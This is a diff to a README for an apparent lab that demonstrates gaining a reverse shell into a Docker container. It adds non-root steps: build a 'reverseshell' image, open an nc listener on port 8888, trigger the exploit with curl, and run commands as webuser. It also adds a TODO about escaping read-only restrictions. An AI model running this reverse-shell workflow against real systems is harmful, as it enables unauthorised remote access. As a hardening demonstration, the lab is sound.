@@ -1,6 +1,10 @@
 # README.md
 Demonstrates getting access into a container
 
+## TODO: 
+1. Is it possible to escape the read-only and run tools in the package lists?  
+
+
 ## Find IP
 ```sh
 #MacOS
@@ -66,6 +70,41 @@ You will see a bash prompt that is connected to the container.
 ```sh 
 # Try and install something - but this time it FAILS.
 apt install curl
+
+# Exiting will kill the container process
+exit
+```
+
+## Nonroot
+### Shell 1
+Build and run a non-root user image.   
+
+```sh
+docker build --target non_root -t reverseshell . 
+# Make sure that LOCAL_IP is set
+docker run --env REMOTE_HOST=${LOCAL_IP} --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
+```
+
+### Shell 2
+Run the callback service in a seperate shell 
+```sh
+nc -l -p 8888 -vvv 
+```
+
+### Shell 3
+Invoke the exploit against the web server
+```sh
+curl localhost:8080
+```
+
+Now go back to shell 2 running the callback and list the contents. 
+You will see a bash prompt that is connected to the container. 
+```sh 
+# You're webuser now.
+whoami
+# Try and install something - but this time it FAILS.
+apt install curl
+
 
 # Exiting will kill the container process
 exit
